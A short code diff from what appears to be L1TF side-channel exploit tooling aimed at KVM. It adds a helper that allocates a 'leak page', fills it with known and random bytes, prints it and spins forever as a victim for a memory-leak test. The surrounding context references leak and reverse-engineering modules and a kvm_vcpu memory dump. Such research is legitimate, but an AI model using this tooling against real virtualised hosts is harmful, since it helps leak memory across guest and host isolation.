@@ -17,6 +17,7 @@
 #include "timing.h"
 #include "reverse.h"
 #include "benchmark.h"
+#include "statistics.h"
 #include "leak.h"
 #include <sys/types.h>
 #include <sys/stat.h>
@@ -3257,4 +3258,17 @@ kvm_vcpu+0x2d8 - 0xd0 + 190:  ffffffffffffffff   ff ff ff ff ff ff ff ff .......
 kvm_vcpu+0x2d8 - 0xd0 + 198:  ffffffffffffffff   ff ff ff ff ff ff ff ff ........
 kvm_vcpu+0x2d8 - 0xd0 + 1a0:  ffffffffffffffff   ff ff ff ff ff ff ff ff ........
 */
+}
+
+void create_page_and_leak_address_and_spin_forever(void)
+{
+	void *vp = l1tf_spawn_leak_page();
+	printf("starting l1tf_find_page_pa(%p)...\n", vp);
+	for (int i = 0; i < 128; i++)
+		*((char *)vp + i) = (char)i;
+	*(u64 *)vp = rand64();
+	printf("victim page data:\n");
+	display(vp, 128);
+	printf("forever idle spinning now...\n");
+	while (1);
 }
